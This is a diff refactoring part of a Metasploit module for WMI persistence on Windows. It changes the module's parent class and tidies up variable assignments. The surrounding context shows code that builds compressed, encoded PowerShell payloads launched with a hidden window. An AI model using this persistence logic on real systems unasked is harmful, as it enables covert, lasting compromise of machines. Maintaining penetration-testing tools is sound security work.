@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class MetasploitModule < Msf::Exploit::Persistence
+class MetasploitModule < Msf::Persistence
   Rank = NormalRanking
 
   include Msf::Post::Windows::Powershell
@@ -127,8 +127,8 @@ class MetasploitModule < Msf::Exploit::Persistence
   def build_payload
     if datastore['CUSTOM_PS_COMMAND']
       script_in = datastore['CUSTOM_PS_COMMAND']
-      compressed_script = compress_script(script_in, eof = nil)
-      encoded_script = encode_script(compressed_script, eof = nil)
+      compressed_script = compress_script(script_in, nil)
+      encoded_script = encode_script(compressed_script, nil)
       generate_psh_command_line(noprofile: true, windowstyle: 'hidden', encodedcommand: encoded_script)
     else
       cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)
@@ -201,7 +201,7 @@ class MetasploitModule < Msf::Exploit::Persistence
     logs = ::File.join(Msf::Config.log_directory, 'wmi_persistence',
                        Rex::FileUtils.clean_path(host + filenameinfo))
     ::FileUtils.mkdir_p(logs)
-    logfile = ::File.join(logs, Rex::FileUtils.clean_path(host + filenameinfo) + '.rc')
+    ::File.join(logs, Rex::FileUtils.clean_path(host + filenameinfo) + '.rc')
   end
 
   def remove_persistence
